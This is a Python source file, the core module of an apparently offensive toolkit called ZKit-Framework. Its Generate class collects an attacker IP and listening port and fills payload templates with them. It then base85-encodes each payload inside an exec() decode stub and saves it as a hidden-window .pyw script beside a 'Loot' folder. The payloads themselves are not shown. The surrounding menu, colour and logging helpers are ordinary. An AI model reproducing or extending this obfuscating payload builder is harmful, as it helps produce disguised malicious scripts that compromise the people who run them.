"""The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file"""
import os
import random
from base64 import b85encode as be
import socket as s
from core.lib.payload import PayloadGenerator
from datetime import datetime as dt
path = '\\'.join(__file__.replace("/", '\\').split("\\")[:-3])

DECODE_STUB = 'from base64 import b85decode as {b}\nvalue ="""{}"""''\nexec({b}(value))'
ASK_FOR_ASKING_STRING = "Payload is asking for a(n) '{}'. And is required : "
ASK_FOR_REPORT_STRING = "Passing \\| to payload as {}"


def init():
    'inits the zkit . without you will get several errors'
    pathslist = [path + "\\Builded\\", path + '\\Loot\\',
                 path + "\\User\\Payloads\\"

                 ]
    for _path in pathslist:
        os.popen("mkdir \"{}\"".format(_path)).close()
    os.popen('echo. > {}'.format(path + "\\Errors.log"))

    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Color:
    'ANSI Color codes'

    def __init__(self):
        self.colors = {
            "black": "\033[30m",
            "red": "\033[31m",
            "green": "\033[32m",
            "yellow": "\033[33m",
            "blue": "\033[34m",
            "magenta": "\033[35m",
            "cyan": "\033[36m",
            "grey": "\033[37m",
            "reset": "\033[0m",
        }

    def GetColor(self, colorname):  # pylint: disable=C0103; # noqa
        'Gets a color from colors dict case insensetive'
        return self.colors.get(colorname.lower())

    def GetAllColors(self):  # pylint: disable=C0103; # noqa
        "returns all colors and reset as a tuple"
        return tuple(self.colors.values())

    def RandomColor(self):
        colors = [*self.GetAllColors()]
        gc = self.GetColor
        to_remove = ['grey', 'reset', 'black']
        for r in to_remove:
            colors.remove(gc(r))
        return random.choice(colors)


def search_for_payloads(where="\\User\\Payloads\\") -> dict:
    "searches \\User\\Payloads\\ for payloads to install or the place you say"
    payloads = {}
    for r, d, _ in os.walk(path + where):
        for payload in d:

            payloads[payload] = r + payload

    return payloads


def list_payloads(payloads=search_for_payloads()):
    "You can get the result form search_user_payloads or i will do it"
    col = Color()
    for index, payload in enumerate(payloads.keys()):
        print(col.RandomColor() + "{%s} --> %s" % (str(index + 1), payload + ((15 - len(payload)) # an ouudated code was fixed 
              * " ") + " >>> " + payloads[payload].replace(path, '')) + col.GetColor('reset'))
        
    print("\n{000} --> Back To Main Menu")
    return payloads


def list_builtin_payloads(payload_type):
    path = "\\core\\lib\\payloads\\" + payload_type + "\\"
    payloads = search_for_payloads(path)
    payloads = list_payloads(payloads)
    print("Please Choose One Of Them (Number Of It): ", end="")
    return payloads


def crash_handler(exception: BaseException):
    with open(path + "\\Errors.log", "a") as f:
        f.write("[{}] : {}\n".format(dt.now(), str(exception)))
    print("Sth went really wrong that we couldnt handle it\n"
          + "the exceptions value have saved to Errors.log\n"
          + "please report this on github to me."
          + "Do you want zkit to reraise it ? (reraising may help better) (Y/N): ", end='')
    choice = str(input()).lower()
    if choice.strip() == "y":
        print("This is going to print full error . please report it on github")
        raise
    else:
        print("Ignoring")


def notify(status: str, message: str, ending="\n", flush=False):
    """
    notifies the user with given parameters . you can customize it very well

    Args:
        message (str): message shown for the user
        status (str): status for event . all possibleties are "notify",
        "problem", "report" and "question" status will be converted to lower .
        ending (str): used as value for print(message, end = ending)
        flush (bool): to flush the stream or not (default=False)
    """
    col = Color()
    reset = col.GetColor('reset')
    status = status.lower()
    all_stats = {'report': 'blue|[ REPORT ]',
                 'notify': 'green|[ NOTIFY ]',
                 'problem': 'red|[CRITICAL]',
                 'question': 'yellow|[QUESTION]',
                 }
    for stat in all_stats:
        if stat == status:
            temp = all_stats[stat].split('|')
            first = col.GetColor(temp[0]) + temp[1] + reset
            break
    if flush:
        flusher = '\r'
    else :
        flusher = ""
    print(f"{flusher}{first}{message}",end=ending)


def ask_for(message: str, report: str, default=None, type=str):  # pylint: disable=W0622; # noqa
    """
    Asks for anything from users . (uses notify)

    Args:
        message (str): message to show the user to ask for details .
        report (str): message to show user that your data is correct .
        default (list): default value and action for that if callable calls it with the arguments
        else replaces it with default[1] . (Defaults to None).
        type (type): type of data to apply to input. (Default : str)

    Returns:
        (type): the value user entered in type of the "type" argument.
        changed if matched the default to whatever to put in defaults[1]
    """
    notify('question', message, '')
    if type == list:
        value = str(input("")).split()

    else:
        value = type(input(""))

    if value == default[0]:
        if callable(default[1]):
            value = default[1]()
        else:
            value = default[1]
    notify('report', report.replace('\\|', str(value), 1))
    return value


class Generate:
    def __init__(self, root: str):
        "generates payloads with given root"
        from core.helper_core import create_file,open_file,write_file
        self.root = root
        self.pg = PayloadGenerator(self.root)
        self.get_fields()
        self.get_info()
        self.get_payload()
        self.payload = encrypt_it(self.payload, chr(random.randint(65, 122)))
        self.path = create_file(path + "\\Builded\\" + self.path + ".pyw")
        f = open_file(self.path)
        write_file(f, self.payload)
        notify('report', "Operaion Was Successful")

    def get_info(self):
        datas = []
        for field in self.fields:
            print(field)
            if field.lower() in ('host', 'ip', 'hostname', 'domain', 'attacker_ip'):
                data = ask_for("Whats you ip address, hostname" +
                               "left it to empty to use your own hostname (automic) : ",
                               "Passing \\| to payload as hostname", default=['', s.gethostname],
                               )
            # so you can name it porty and portport or THEPORT or other names that 'port' is in it and zkit understand it .
            elif 'port' in field.lower():
                data = ask_for("Whats An Open Port In Your Machine " +
                               "Left It '-1' To Use Default Port (1534 Eclipse's "
                               "default communicate port) : ", "Passing \\| to payload as port",
                               default=[-1, 1534], type=int,
                               )
            else:
                data = ask_for(ASK_FOR_ASKING_STRING.format(field),
                               ASK_FOR_REPORT_STRING.format(field))
            datas.append(data)
        self.args = datas
        print(self.args)
        self.path = ask_for("Whats the filename  " +
                            "for your zkit generated script : ",
                            "using \\|.pyw as your filename",
                            default=['', ''], type=str,
                            )
        print(*self.args)

    def get_payload(self) -> str:
        self.payload = self.pg.generate(self.args)

    def get_fields(self):
        self.fields = self.pg.get_fields()


def encrypt_it(payload, b) -> str:
    notify("notify", "Encrypting Data Before Writing On File...", "")
    payload = be(payload.encode("UTF-8")).decode("UTF-8")
    print("Done")
    return DECODE_STUB.format(payload, b=b)


def print_banner():
    from core.helper_core.banners import banner1, banner2
    "gets a random color and a random banner and prints it"
    reset = Color().GetColor('reset')
    random.seed(random.choice(
        [random.randint(1, 9999), random.randint(1, 998)]))
    banner = random.choice([banner1, banner2])
    color = Color().RandomColor()
    print(color + banner + reset)
